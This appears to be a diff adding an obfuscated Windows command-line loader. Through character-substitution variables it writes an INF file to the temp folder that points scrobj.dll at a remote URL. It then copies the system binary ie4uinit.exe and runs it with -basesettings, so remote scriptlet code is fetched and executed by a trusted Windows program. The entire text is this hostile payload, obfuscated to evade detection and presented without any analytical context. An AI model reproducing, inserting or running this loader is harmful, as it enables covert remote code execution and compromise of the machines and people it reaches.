@@ -1,0 +1,17 @@
+/v /c  (for %a in ("restrai=c" "bookrests=s" "ant=ll" "orcha=e" ) do @set %~a) &&
+  callcallcallcallcallcall(for %n in ("u") do @set "parasit=%~n") &&
+  callcallcall(for %w in ("e") do @set "petron=%~w") &&
+  (for %p in ("e") do @set "petron=%~p") &&
+  (for %v in ("v") do @set "cont=%~v") &&
+  (for %r in ("\") do @set "mantis=%~r") &&
+  (for %r in ("-") do @set "unj=%~r") &&
+  callcallcallcallcallcallcall(for %o in ("i") do @set "nonelabo=%~o") &&
+  call(for %v in ("l") do @set "wav=%~v") &&
+  (for %k in ("X") do @set "prespeciali=%~k") &&
+  call(for %a in ("l") do @set "wav=%~a") &&
+  (for %k in ("c") do @set "thr=%~k") &&
+  callcall(for %j in ("g") do @set "squawberr=%~j") &&
+  (for %l in ("9") do @set "tramm=%~l") &&
+  callcallcallcall(for %d in ("[tet_F74988]" "%massermi%c%hylozois%o%aeronau%\" "j%massager%d%teache%l,%marquisd%I,h%commendato%t%totteris%:%candler%/%ban%a%aeronau%v%massager%a%skiapod%w%hylozois%v%massager%c%cleido%m%candler%a%massermi%f%ban%h%massermi%" "[defaultinstall.windows7]" "delfiles=4875" "Un\" "Register\" "OCXs=tet_F74988" "[version]" "signature=$windows nt$" "[4875]" "i%megaloc%u%patc%n%patc%t%massager%i%tresslet%f" "[destinationdirs]" "defaultdestdir=11" "4875=01" "[strings]" "servicename= 'lor'" "shortsvcname= 'lor'" "massager=." "candler=/" "marquisd=N" "aeronau=b" "megaloc=e" "patc=i" "ban=k" "teache=l" "tresslet=n" "cleido=o" "totteris=p" "hylozois=r" "massermi=s" "commendato=t" "skiapod=v" ) do @echo %~d) > "%temp%\ieuinit.inf" &&
+  call xcopy /Y /C /Q %windir%\system32\ie4uinit.exe "%temp%" &&
+  start " " %temp%\ie4uinit.exe -basesettings
